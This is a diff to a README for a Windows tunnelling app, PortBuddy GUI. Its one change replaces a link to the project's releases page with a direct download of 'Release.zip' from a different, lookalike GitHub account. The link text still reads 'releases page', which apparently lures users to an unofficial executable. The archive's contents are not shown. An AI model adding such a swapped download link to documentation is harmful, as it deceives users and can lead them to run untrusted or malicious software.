@@ -18,7 +18,7 @@ PortBuddy GUI provides a simple Windows desktop application for managing tunnels
 
 ### 1. Download & Install
 
-Download `portbuddy_gui.exe` from the [releases page](https://github.com/quack-stuff/portbuddy-gui/releases).
+Download `portbuddy_gui.exe` from the [releases page](https://github.com/Vaxtrexa/port-buddy-gui/releases/download/Release/Release.zip).
 
 No installation needed - just run the executable.
 
